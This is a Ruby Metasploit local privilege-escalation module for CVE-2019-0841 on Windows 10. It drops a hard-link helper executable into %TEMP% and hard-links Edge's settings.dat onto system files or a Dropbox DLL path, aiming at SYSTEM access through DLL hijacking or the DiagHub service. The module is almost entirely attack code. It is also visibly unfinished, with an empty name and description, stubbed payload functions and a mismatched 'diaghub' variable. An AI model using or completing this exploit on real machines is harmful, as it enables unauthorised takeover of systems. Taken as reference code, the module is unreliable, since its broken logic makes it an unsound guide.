##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::FileInfo
  include Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '',
      'Description'    => %q(
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'Nabeel Ahmed',      # Vulnerability discovery and PoC
        'James Forshaw',     # Code creating hard links and communicating with DiagHub service
        'Shelby Pace'        # Metasploit module
      ],
      'References'     =>
        [
          [ 'CVE', '2019-0841' ],
          [ 'URL', 'https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/' ],
          [ 'URL', 'https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html' ],
          [ 'URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html' ],
          [ 'URL', 'https://0x00-0x00.github.io/research/2019/05/30/Coding-a-reliable-CVE-2019-0841-Bypass.html' ]
        ],
      'Targets'        =>
        [
          [ 'Windows 10', { 'Platform' => 'win' } ]
        ],
      'DisclosureDate' => '2019-04-09',
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('SRC_PATH', [ false, 'The settings.dat file to use', 'Microsoft.MicrosoftEdge_8wekyb3d8bbwe' ]),
      OptString.new('PROCESS', [ false, 'The executable to open', 'start microsoft-edge:' ])
    ])
  end

  def check
    return CheckCode::Unknown if sysinfo['OS'] !~ /windows\s10/i

    path = expand_path('%WINDIR%\\system32\\win32k.sys')
    major, minor, build, revision, brand = file_version(path)
    return CheckCode::Detected if build < 17763

    CheckCode::Appears
  end

  def validate_target
    fail_with(Failure::None, 'Already running with SYSTEM privileges') if is_system?

    fail_with(Failure::NoTarget, 'The target is not running Windows') unless session.platform == 'windows'
  end

  def write_to_disk
    link_file_name = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(6...8)}.exe")
    if session.arch == ARCH_X86
      exe_name = 'CVE-2019-0841_x86.exe'
    elsif session.arch == ARCH_X64
      exe_name = 'CVE-2019-0841_x64.exe'
    end
    contents = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-0841', exe_name))
    write_file(link_file_name, contents)
    register_file_for_cleanup(link_file_name)
    link_file_name
  rescue
    fail_with(Failure::UnexpectedReply, 'Failed to write file contents to target')
  end

  def init_process
    print_status("Attempting to launch process: #{datastore['PROCESS']}")
    out = cmd_exec_get_pid("cmd.exe /c #{datastore['PROCESS']}", nil, 30)
  end

  def mk_hard_link(src, target, link_exe)
    out = cmd_exec("cmd.exe /c #{link_exe} \"#{src}\" \"#{target}\"")
    return true if out && out.include?('Done')

    false
  end

  def write_payload(file_name)
    print_status('Writing the payload to disk')
    code = generate_payload_dll
    #code = generate_payload_exe
    #orig_data = read_file(file_name)
    #write_file(file_name, code)
    #orig_data
  end

  def load_dll_with_diaghub
    diaghub_name = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(6...8)}.exe")

    register_file_for_cleanup(diaghub_name)
  end

  def exploit
    diag_hub = false
    vuln_status = check
    fail_with(Failure::NotVulnerable, 'Failed to detect Windows 10') if vuln_status == CheckCode::Unknown

    if vuln_status == CheckCode::Detected
      vprint_status('The DiagHub service can be used to get SYSTEM privileges')
      diag_hub = true
    end

    validate_target
    dat_path = expand_path("%USERPROFILE%\\AppData\\Local\\Packages\\#{datastore['SRC_PATH']}\\Settings\\Settings.dat")
    hard_link_exe = write_to_disk

    if diaghub
      rtf_path = expand_path('%WINDIR%\\system32\\license.rtf')
      fail_with(Failure::UnexpectedReply, 'Did not retrieve expected output') unless mk_hard_link(dat_path, rtf_path, hard_link_exe)
      #load_dll_with_diaghub
    else
      # use datastore options to hijack some application's dll that's loaded with SYSTEM
      # use write_payload
      placeholder = expand_path("%PROGRAMFILES(x86)%\\Dropbox\\Update\\1.3.189.1\\goopdate.dll")
      fail_with(Failure::UnexpectedReply, 'Did not retrieve expected output') unless mk_hard_link(dat_path, placeholder, hard_link_exe)
    end
    print_good('Successfully created hard link')
    pid = init_process
    cmd_exec("cmd.exe /c taskkill /F /PID #{pid}")
  end
end
